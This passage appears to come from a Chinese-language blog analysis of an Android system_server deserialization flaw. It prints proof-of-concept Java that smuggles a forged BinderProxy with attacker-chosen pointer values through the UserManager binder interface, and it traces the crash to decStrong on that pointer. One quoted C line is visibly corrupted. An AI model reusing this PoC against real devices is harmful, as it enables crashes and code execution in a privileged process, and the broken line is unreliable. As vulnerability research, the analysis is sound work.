I/DEBUG   (  <span class="number">175</span>):     <span class="number">#11</span>  <span class="literal">pc</span> <span class="number">0000</span>d308  /system/lib/libc.so (pthread_create+<span class="number">240</span>)
<span class="label">...</span>
</code></pre><h3 id="崩溃日志">崩溃日志</h3><p>简单说下崩溃日志格式</p>
<ol>
<li>ndk crash log以<strong><em> </em></strong> <strong><em> </em></strong> <em>*</em>开始. </li>
<li>第一行Build fingerprint: ‘google/hammerhead/hammerhead:4.4.4/KTU84P/1227136:user/release-keys’ 指明了运行的Android版本, 如果您有多份crash dump的话这个信息就比较有用了。</li>
<li>接着一行显示的是当前的线程id(pid)和进程id(tid). 如果当前崩溃的线程是主线程的话, pid和tid会是一样的。</li>
<li>第四行, 显示的是unix信号. 这里的signal 11，即SIGSEGV，表示段错误，是最常见的信号。(SIGSEGV自行google) </li>
<li>接下来的部分是系统寄存器的dump信息。</li>
<li>Crash dump还包含PC之前和之后的一些内存字段. </li>
<li>最后是崩溃时的调用堆栈，如果你执行的是debug版本，还能还原一些c++代码。</li>
</ol>
<h3 id="几个重要的寄存器">几个重要的寄存器</h3><ol>
<li>r0-r3 用作传入函数参数，传出函数返回值。当参数不超过4个时,可以使用寄存器R0~R3来进行参数传递，当参数超过4个时，使用数据栈来传递参数；结果为一个32位的整数时，通过寄存器r0返回；结果为一个64位整数时，通过寄存器r0，r1返回。另外很重要的一点，在C++中，第一个参数就是this指针，所以this指针是存放在r0中的。</li>
<li>r4-r11 被用来存放函数的局部变量。</li>
<li>fp (or r11) 指向当前正在执行的函数的堆栈底。</li>
<li>sp (or r13) 当前正在执行的函数的堆栈顶.(跟fp相对应)</li>
<li>lr (or r14) link register. 简单来说，当当前指令执行完了，就会从这个寄存器获取地址，来知道需要返回，到哪里继续执行。</li>
<li>pc (or r15) program counter. 程序计数器。</li>
</ol>
<h2 id="漏洞POC分析">漏洞POC分析</h2><p>从上边崩溃日志中看出，system_server执行到0x1337bef3地址后触发<code>Error writing application restrictions list</code>写错误，最终造成了崩溃。</p>
<h3 id="漏洞触发过程">漏洞触发过程</h3><p>结合崩溃信息看poc源码，源码触发过程如下：</p>
<p>1.创建可序列化的对象AAdroid.os.BinderProxy并将其放入Bundle数据中。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Bundle bundle = <span class="keyword">new</span> Bundle();</span><br><span class="line">BinderProxy evilProxy = <span class="keyword">new</span> BinderProxy();</span><br><span class="line">evilProxy.mOrgue = staticAddr;</span><br><span class="line">evilProxy.mObject = staticAddr;</span><br><span class="line">bundle.putSerializable(<span class="string">"eatthis"</span>, evilProxy);</span><br></pre></td></tr></table></figure>
<p>类AAdroid.os.BinderProxy代码：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BinderProxy</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> mObject = <span class="number">0x1337beef</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> mOrgue = <span class="number">0x1337beef</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>注意其中两个可控的成员变量mObject和mOrgue分别赋值0x1337beef，正是崩溃点。</p>
<p>2.通过一系列java的反射机制，获得跨进程调用system_server的IBinder接口mRemote，为与system_server的跨进程通信做准备。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 获取类对象android.os.IUserManager.Stub</span></span><br><span class="line">Class stubClass = <span class="keyword">null</span>;</span><br><span class="line">Class[] umSubclasses = Class.forName(<span class="string">"android.os.IUserManager"</span>).getDeclaredClasses();</span><br><span class="line">System.out.println(umSubclasses.length + <span class="string">" inner classes found"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (Class inner : umSubclasses) &#123;</span><br><span class="line">    <span class="keyword">if</span> (inner.getCanonicalName().equals(<span class="string">"android.os.IUserManager.Stub"</span>)) &#123;</span><br><span class="line">        stubClass = inner;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取对象android.os.IUserManager.Stub中TRANSACTION_setApplicationRestrictions的值用于transact()</span></span><br><span class="line">Field TRANSACTION_setApplicationRestrictionsField = stubClass.getDeclaredField(<span class="string">"TRANSACTION_setApplicationRestrictions"</span>);</span><br><span class="line">TRANSACTION_setApplicationRestrictionsField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">TRANSACTION_setApplicationRestrictions = TRANSACTION_setApplicationRestrictionsField.getInt(<span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取类对象android.os.IUserManager.Stub.Proxy</span></span><br><span class="line">Class proxyClass = <span class="keyword">null</span>;</span><br><span class="line">Class[] umStubclasses = stubClass.getDeclaredClasses();</span><br><span class="line">System.out.println(umStubclasses.length + <span class="string">" inner classes found"</span>);</span><br><span class="line"><span class="keyword">for</span> (Class inner : umStubclasses) &#123;</span><br><span class="line">    <span class="keyword">if</span> (inner.getCanonicalName().equals(<span class="string">"android.os.IUserManager.Stub.Proxy"</span>)) &#123;</span><br><span class="line">        proxyClass = inner;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取UserManager类对象实例</span></span><br><span class="line">UserManager userManager = (UserManager) context.getSystemService(Context.USER_SERVICE);</span><br><span class="line"><span class="comment">// 获取UserManager类对象中mService对象, 类型为IUserManager</span></span><br><span class="line">Field mServiceField = UserManager.class.getDeclaredField(<span class="string">"mService"</span>);</span><br><span class="line">mServiceField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"><span class="comment">// 获取UserManager类对象实例中的mService对象值</span></span><br><span class="line">Object mService = mServiceField.get(userManager);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取类对象android.os.IUserManager.Stub.Proxy中的mRemote对象</span></span><br><span class="line">Field mRemoteField = proxyClass.getDeclaredField(<span class="string">"mRemote"</span>);</span><br><span class="line">mRemoteField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"><span class="comment">// 获取获取类型为IUserManager的实例对象mService对象值</span></span><br><span class="line">mRemote = (IBinder) mRemoteField.get(mService);</span><br></pre></td></tr></table></figure>
<p>3.调用setApplicationRestrictions函数，传入之前打包evilproxy的Bundle数据作为参数。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">setApplicationRestrictions</span><span class="params">(java.lang.String packageName, android.os.Bundle restrictions, <span class="keyword">int</span></span><br><span class="line">            userHandle)</span> <span class="keyword">throws</span> android.os.RemoteException </span>&#123;</span><br><span class="line">    android.os.Parcel _data = android.os.Parcel.obtain();</span><br><span class="line">    android.os.Parcel _reply = android.os.Parcel.obtain();</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        _data.writeInterfaceToken(DESCRIPTOR);</span><br><span class="line">        _data.writeString(packageName);</span><br><span class="line">        _data.writeInt(<span class="number">1</span>);</span><br><span class="line">        restrictions.writeToParcel(_data, <span class="number">0</span>);</span><br><span class="line">        _data.writeInt(userHandle);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">byte</span>[] data = _data.marshall();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; <span class="keyword">true</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (data[i] == <span class="string">'A'</span> &amp;&amp; data[i+<span class="number">1</span>] == <span class="string">'A'</span> &amp;&amp; data[i+<span class="number">2</span>] == <span class="string">'d'</span> &amp;&amp; data[i+<span class="number">3</span>] == <span class="string">'r'</span>) &#123;</span><br><span class="line">                data[i] = <span class="string">'a'</span>;</span><br><span class="line">                data[i+<span class="number">1</span>] = <span class="string">'n'</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        _data.recycle();</span><br><span class="line">        _data = Parcel.obtain();</span><br><span class="line">        _data.unmarshall(data, <span class="number">0</span>, data.length);</span><br><span class="line"></span><br><span class="line">        mRemote.transact(TRANSACTION_setApplicationRestrictions, _data, _reply, <span class="number">0</span>);</span><br><span class="line">        _reply.readException();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">finally</span> &#123;</span><br><span class="line">        _reply.recycle();</span><br><span class="line">        _data.recycle();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>将该函数与Android源码中的Android.os.IUserManager.Stub.Proxy.setApplicationRestrictions函数对比，主要的区别在于将传入的Bundle数据进行了修改，将之前可序列化的AAdroid.os.BinderProxy对象修改为了不可序列化的Android.os.BinderProxy对象，这样就将不可序列化的Bundles数据，通过Binder跨进程调用，传入system_server中，system_server在处理这些数据时造成异常崩溃。</p>
<h3 id="进程间通信">进程间通信</h3><h4 id="Binder">Binder</h4><p>通过POC知道造成崩溃行为的代码为mRemote.transact(TRANSACTION_setApplicationRestrictions, _data, _reply, 0)，这里就涉及到进程间通信，在Android中，Binder用于完成进程间通信（IPC），即把多个进程关联在一起，以下摘自网络：</p>
<blockquote>
<p>Binder是一种架构，这种架构提供了服务端接口、Binder驱动、客户端接口三个模块。<br>　　服务端：一个Binder服务端实际上就是一个Binder类的对象，该对象一旦创建，内部就启动一个隐藏线程。该线程接下来会接收Binder驱动发送的消息，收到消息后，会执行到Binder对象中的onTransact()函数，并按照该函数的参数执行不同的服务代码。因此，要实现一个Binder服务，就必须重载onTransact()方法。重载onTransact()函数的主要内容是把onTransact()函数的参数转换为服务函数的参数，而onTransact()函数的参数来源是客户端调用transact()函数时输入的，因此，如果transact()有固定格式的输入，那么onTransact()就会有固定格式的输出。<br>　　Binder驱动：任意一个服务端Binder对象被创建时，同时会在Binder驱动中创建一个mRemote对象，该对象的类型也是Binder类。客户端要访问远程服务时，都是通过mRemote对象。<br>　　客户端：客户端要想访问远程服务，必须获取远程服务在Binder对象中对应的mRemote引用，获得该mRemote对象后，就可以调用其transact()方法，而在Binder驱动中，mRemote对象也重载了transact()方法，重载的内容主要包括以下几项：1. 以线程间消息通信的模式，向服务端发送客户端传递过来的参数。2. 挂起当前线程，当前线程正是客户端线程，并等待服务端线程执行完指定服务函数后通知(notify)。3. 接收到服务端线程的通知，然后继续执行客户端线程，并返回到客户端代码区。</p>
</blockquote>
<p>通过上边简短的介绍，我们知道，要想使用服务端，首先要获取服务端在Binder驱动中对应的mRemote变量的引用，在POC中通过反射方式获得。<br>获得该变量的引用后，就可以调用该变量的transact()方法。该方法的函数原型：public final boolean transact(int code, Parcel data, Parcel reply,int flags)，其中data表示的是要传递给远程Binder服务的包裹(Parcel)，远程服务函数所需要的参数必须放入这个包裹中。包裹中只能放入特定类型的变量，这些类型包括常用的原子类型，比如String、int、long等，要查看包裹可以放入的全部数据类型，可以参照Parcel类。除了一般的原子变量外，Parcel还提供了一个writeParcel()方法，可以在包裹中包含一个小包裹。因此，要进行Binder远程服务调用时，服务函数的参数要么是一个原子类，要么必须继承于Parcel类，否则，是不能传递的。这也是为什么最开始要创建一个可序列化的对象AAdroid.os.BinderProxy并将其放入Bundle数据中。</p>
<p>网上关于进程间通信的资料大部分都是又臭又长，如果想快速了解推荐一篇文章 <a href="http://www.cnblogs.com/noTice520/archive/2012/11/01/2750209.html" target="_blank" rel="external">android中的跨进程通信的实现（一）——远程调用过程和aidl</a></p>
<h4 id="service_manager和binder_service">service manager和binder service</h4><p>Binder是android系统中实现跨进程通信(IPC)的一种重要机制。service manager是所有binder service的管理者，但它并不是这些binder service的创建者。这些binder service有些是init进程启动的服务创建的，有些是system_server进程创建的，但是service manager会管理所有binder service的信息，方便client查询以及调用。</p>
<p>service manager是由init进程直接启动的，ActivityManagerService，PackageManagerService等系统的基本服务(frameworks\base\services\java\com\android\server源码路径里的服务类)由system_server进程启动的。binder service实际上并没有单独的进程，它们只是system_server的一个子线程。init进程会启动surface flinger，media server, drmserver等服务，在这些服务里会创建binder service，并注册到service manager。</p>
<p>native binder service 和 java 层的binder service，都会交由service manager注册，然后由service manager管理。客户端使用binder service时需要向service manager查询得到binder service在当前进程的一个代理proxy，通过代理与binder service的服务端交互。</p>
<h3 id="漏洞触发过程中数据的parcel和unparcel">漏洞触发过程中数据的parcel和unparcel</h3><p>进程间传递Parcel类型数据，一端通过writeToParcel将对象映射成Parcel对象传递出去，另一端再通过createFromParcel将Parcel对象映射回原始对象进行处理。可以将Parcel看成是一个流，通过writeToParcel把对象写到流里面，在通过createFromParcel从流里读取对象。</p>
<p>然后看POC中修改过的不可反序列化的parcel对象Android.os.BinderProxy的处理过程，接POC最后执行流程，执行过mRemote.transact(TRANSACTION_setApplicationRestrictions, _data, _reply, 0)过后，system_server层会去调用IUserManager.onTransact()方法，来到case TRANSACTION_setApplicationRestrictions分支开始处理传进来的parcel数据流：</p>
<p>先是_arg1 = android.os.Bundle.CREATOR.createFromParcel(data)读取数据对象，然后调用this.setApplicationRestrictions(_arg0, _arg1, _arg2);然后转入UserManagerService，UserManagerService继承IUserManager.Stub并实现了setApplicationRestrictions方法，下边的调用流程为(跟着参数_arg1也就是修改过不可反序列化的对象走)</p>
<blockquote>
<p>IUserManager.Stub.Proxy.setApplicationRestrictions(_arg0, _arg1, _arg2) -&gt;<br>UserManagerService.setApplicationRestrictions -&gt;<br>UserManagerService.writeApplicationRestrictionsLocked -&gt;<br>Bundle.keySet()(restrictions.keySet()) -&gt;<br>Bundle.unparcel() -&gt;<br>Parcel.readArrayMapInternal() -&gt;<br>Parcel.readValue(ClassLoader) -&gt;<br>Parcel.readSerializable(ClassLoader) -&gt;<br>ObjectInputStream.readObject() -&gt;<br>ObjectInputStream.readNonPrimitiveContent() -&gt;<br>ObjectInputStream.readNewObject() -&gt;</p>
</blockquote>
<p>对比之前版本知道，最后classDesc.checkAndGetTcObjectClass()这里就是补丁代码了，进去checkAndGetTcObjectClass()看到上边几行注释</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span><br><span class="line"> * Checks the local class to make sure it is valid for &#123;<span class="doctag">@link</span> ObjectStreamConstants#TC_OBJECT&#125;</span><br><span class="line"> * deserialization. Also performs some sanity checks of the stream data. This method is used</span><br><span class="line"> * during deserialization to confirm the local class is likely to be compatible with the coming</span><br><span class="line"> * stream data, but before an instance is instantiated.</span><br><span class="line"> *</span><br><span class="line"> * <span class="doctag">@hide</span> used internally during deserialization</span><br><span class="line"> */</span></span><br></pre></td></tr></table></figure>
<p>注释也很清楚了说明了，这是加的一个补丁，在数据被实例化之前，用来检测对象是否可被反序列化。<br>更详细的补丁代码可以查看：<a href="https://github.com/CyanogenMod/android_libcore/commit/2d0fbea07c1a3c4368ddb07609d1a86993ed6de9" target="_blank" rel="external">2d0fbea07c1a3c4368ddb07609d1a86993ed6de9</a></p>
<h2 id="漏洞分析">漏洞分析</h2><p>回过头来看crash dump信息，根据backtrace显示的堆栈调用最后调用了<code>/system/lib/libutils.so (android::RefBase::decStrong(void const*) const+3)</code>。</p>
<h3 id="Android指针管理">Android指针管理</h3><p>Android中通过引用计数来实现智能指针，并且实现有强指针与弱指针。由对象本身来提供引用计数器，但是对象不会去维护引用计数器的值，而是由智能指针来管理。要达到所有对象都可用引用计数器实现智能指针管理的目标，可以定义一个公共类，提供引用计数的方法，所有对象都去继承这个公共类，这样就可以实现所有对象都可以用引用计数来管理的目标，在Android中，这个公共类就是RefBase。</p>
<p>RefBase作为公共基类提供了引用计数的方法，但是并不去维护引用计数的值，而是由两个智能指针来进行管理：sp(Strong Pointer)和wp(Weak Pointer)，代表强引用计数和弱引用计数。RefBase提供了incStrong与decStrong函数用于控制强引用计数值，其弱引用计数值是由weakref_impl控制，强引用计数与弱引用数都保存在weakref_impl *类型的成员变量mRefs中。</p>
<p>当sp销毁时其析构函数调用对象即RefBase的decStrong函数，decStrong中将强引用数与弱引用数同时减1，如果这是最后一个强引用的话，会调用对象的onLastStrongRef，并且判断成员变量mRefs的成员变量mFlags来决定是否在对象的强引用数为0时释放对象。</p>
<h3 id="GC机制">GC机制</h3><p>简单介绍一下Java对象的生命周期与垃圾回收(摘自网络)：</p>
<p>创建对象的方式：</p>
<ul>
<li>用new语句创建对象。</li>
<li>使用反射，调用java.lang.Class或java.lang.reflect.Constructor的newInstance()实例方法。</li>
<li>调用对象的clone()方法</li>
<li>使用反序列化手段，调用java.io.ObjectInputStream对象的readObject()方法。</li>
</ul>
<p>垃圾回收和对象的可触及性：</p>
<ul>
<li>可触及状态：当一个对象被创建后，只要程序中还有引用变量引用该对象，那么它就始终处于可触及状态。</li>
<li>可复活状态：当程序不再有任何引用变量引用对象时，它就进入可复活状态。该状态的对象，垃圾回收器会准备释放它占用的内存，在释放前，会调用它的finalize()方法，这些finalize()方法有可能使对象重新转到可触及状态。</li>
<li>不可触及状态：当JVM执行完所有的可复活状态的finalize()方法后，假如这些方法都没有使对象转到可触及状态。那么该对象就进入不可触及状态。只有当对象处于不可触及状态时，垃圾回收器才会真正回收它占用的内存。</li>
</ul>
<h3 id="漏洞成因">漏洞成因</h3><p>通过RefBase和GC机制的简单了解得知该处崩溃是由于对象销毁触发GC处理过程，当system_server对传进来的对象进行反序列化后就创建了对象，启动Activity后将其最小化，触发GC，由于该对象并没有任何引用，GC清理时就会调用该对象的finalize方法，即调用了Android.os.BinderProxy的finalize方法，然后会调用destroy()，destroy()为native方法。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="annotation">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">finalize</span><span class="params">()</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        destroy();</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        <span class="keyword">super</span>.finalize();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">native</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title">destroy</span><span class="params">()</span></span>;</span><br></pre></td></tr></table></figure>
<p>定位到<a href="https://android.googlesource.com/platform/frameworks/base/+/f76a50c/core/jni/android_util_Binder.cpp" target="_blank" rel="external">android_os_BinderProxy_destroy</a></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">android_os_BinderProxy_destroy</span><span class="params">(JNIEnv* env, jobject obj)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">    IBinder* b = (IBinder*)</span><br><span class="line">            env-&gt;GetIntField(obj, gBinderProxyOffsets.mObject);</span><br><span class="line">    DeathRecipientList* drl = (DeathRecipientList*)</span><br><span class="line">            env-&gt;GetIntField(obj, gBinderProxyOffsets.mOrgue);</span><br><span class="line">    LOGDEATH(<span class="string">"Destroying BinderProxy %p: binder=%p drl=%p\n"</span>, obj, b, drl);</span><br><span class="line">    env-&gt;SetIntField(obj, gBinderProxyOffsets.mObject, <span class="number">0</span>);</span><br><span class="line">    env-&gt;SetIntField(obj, gBinderProxyOffsets.mOrgue, <span class="number">0</span>);</span><br><span class="line">    drl-&gt;decStrong((<span class="keyword">void</span>*)javaObjectForIBinder);</span><br><span class="line">    b-&gt;decStrong(obj);</span><br><span class="line">    IPCThreadState::self()-&gt;flushCommands();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>代码一开始就将gBinderProxyOffsets.mObject和gBinderProxyOffsets.mOrgue强制转换成函数指针，那么gBinderProxyOffsets.mObject和gBinderProxyOffsets.mOrgue是什么鬼？找到BinderProxy服务注册函数int_register_android_os_BinderProxy</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="keyword">char</span>* <span class="keyword">const</span> kBinderProxyPathName = <span class="string">"android/os/BinderProxy"</span>;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">int_register_android_os_BinderProxy</span><span class="params">(JNIEnv* env)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">    jclass clazz;</span><br><span class="line">    clazz = env-&gt;FindClass(<span class="string">"java/lang/ref/WeakReference"</span>);</span><br><span class="line">    LOG_FATAL_IF(clazz == <span class="literal">NULL</span>, <span class="string">"Unable to find class java.lang.ref.WeakReference"</span>);</span><br><span class="line">    gWeakReferenceOffsets.mClass = (jclass) env-&gt;NewGlobalRef(clazz);</span><br><span class="line">    gWeakReferenceOffsets.mGet = env-&gt;GetMethodID(clazz, <span class="string">"get"</span>, <span class="string">"()Ljava/lang/Object;"</span>);</span><br><span class="line">    assert(gWeakReferenceOffsets.mGet);</span><br><span class="line">    clazz = env-&gt;FindClass(<span class="string">"java/lang/Error"</span>);</span><br><span class="line">    LOG_FATAL_IF(clazz == <span class="literal">NULL</span>, <span class="string">"Unable to find class java.lang.Error"</span>);</span><br><span class="line">    gErrorOffsets.mClass = (jclass) env-&gt;NewGlobalRef(clazz);</span><br><span class="line">    clazz = env-&gt;FindClass(kBinderProxyPathName);</span><br><span class="line">    LOG_FATAL_IF(clazz == <span class="literal">NULL</span>, <span class="string">"Unable to find class android.os.BinderProxy"</span>);</span><br><span class="line">    gBinderProxyOffsets.mClass = (jclass) env-&gt;NewGlobalRef(clazz);</span><br><span class="line">    gBinderProxyOffsets.mConstructor = env-&gt;GetMethodID(clazz, <span class="string">"&lt;init&gt;"</span>, <span class="string">"()V"</span>);</span><br><span class="line">    assert(gBinderProxyOffsets.mConstructor);</span><br><span class="line">    gBinderProxyOffsets.mSendDeathNotice = env-&gt;GetStaticMethodID(clazz, <span class="string">"sendDeathNotice"</span>, <span class="string">"(Landroid/os/IBinder$DeathRecipient;)V"</span>);</span><br><span class="line">    assert(gBinderProxyOffsets.mSendDeathNotice);</span><br><span class="line">    gBinderProxyOffsets.mObject = env-&gt;GetFieldID(clazz, <span class="string">"mObject"</span>, <span class="string">"I"</span>);</span><br><span class="line">    assert(gBinderProxyOffsets.mObject);</span><br><span class="line">    gBinderProxyOffsets.mSelfvoid RefBase::decStrong = env-&gt;GetFieldID(clazz, <span class="string">"mSelf"</span>, <span class="string">"Ljava/lang/ref/WeakReference;"</span>);</span><br><span class="line">    assert(gBinderProxyOffsets.mSelf);</span><br><span class="line">    gBinderProxyOffsets.mOrgue = env-&gt;GetFieldID(clazz, <span class="string">"mOrgue"</span>, <span class="string">"I"</span>);</span><br><span class="line">    assert(gBinderProxyOffsets.mOrgue);</span><br><span class="line">    ...</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>代码中可以看到，通过一些列反射通过对象引用计数器获取android.os.BinderProxy对象实例，然后通过</p>
<pre><code>gBinderProxyOffsets.mObject = env-&gt;<span class="constant">GetFieldID(</span>clazz, <span class="string">"mObject"</span>, <span class="string">"I"</span>);
gBinderProxyOffsets.mOrgue = env-&gt;<span class="constant">GetFieldID(</span>clazz, <span class="string">"mOrgue"</span>, <span class="string">"I"</span>);
</code></pre><p>获取其成员变量mObject和mOrgue的值，即获取了AAdroid.os.BinderProxy中的变量mObject和mOrgue的值。而我们可以控制mObject和mOrgue的值，这样就相当于我们可以向system_server传递一个任意值的函数指针this，并在该对象实例被GC时有机会获得控制权。</p>
<p>继续看android_os_BinderProxy_destroy代码，将mOrgue强制转成DeathRecipientList函数指针后会调用函数drl-&gt;decStrong((void*)javaObjectForIBinder)，DeathRecipientList继承RefBase，找到RefBase类中的decStrong方法，位于<a href="http://androidxref.com/4.4.4_r1/xref/system/core/libutils/RefBase.cpp" target="_blank" rel="external">RefBase.cpp</a></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">void</span> RefBase::decStrong(<span class="keyword">const</span> <span class="keyword">void</span>* id) <span class="keyword">const</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 成员变量mRefs是在对象的构造函数中初始化</span></span><br><span class="line">    weakref_impl* <span class="keyword">const</span> refs = mRefs;</span><br><span class="line">    <span class="comment">// 强引用数与弱引用数同时减1</span></span><br><span class="line">    refs-&gt;removeStrongRef(id);</span><br><span class="line">    <span class="comment">// 获取强引用数，返回&amp;refs-&gt;mStrong</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">int32_t</span> c = android_atomic_dec(&amp;refs-&gt;mStrong);</span><br><span class="line"><span class="preprocessor">#<span class="keyword">if</span> PRINT_REFS</span></span><br><span class="line">    ALOGD(<span class="string">"decStrong of %p from %p: cnt=%d\n"</span>, <span class="keyword">this</span>, id, c);</span><br><span class="line"><span class="preprocessor">#<span class="keyword">endif</span></span></span><br><span class="line">    ALOG_ASSERT(c &gt;= <span class="number">1</span>, <span class="string">"decStrong() called on %p too many times"</span>, refs);</span><br><span class="line">    <span class="comment">// 如果这是最后一个强引用的话</span></span><br><span class="line">    <span class="keyword">if</span> (c == <span class="number">1</span>) &#123;</span><br><span class="line">        refs-&gt;mBase-&gt;onLastStrongRef(id);</span><br><span class="line">        <span class="keyword">if</span> ((refs-&gt;mFlags&amp;OBJECT_LIFETIME_MASK) == OBJECT_LIFETIME_STRONG) &#123;</span><br><span class="line">            <span class="keyword">delete</span> <span class="keyword">this</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    refs-&gt;decWeak(id);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
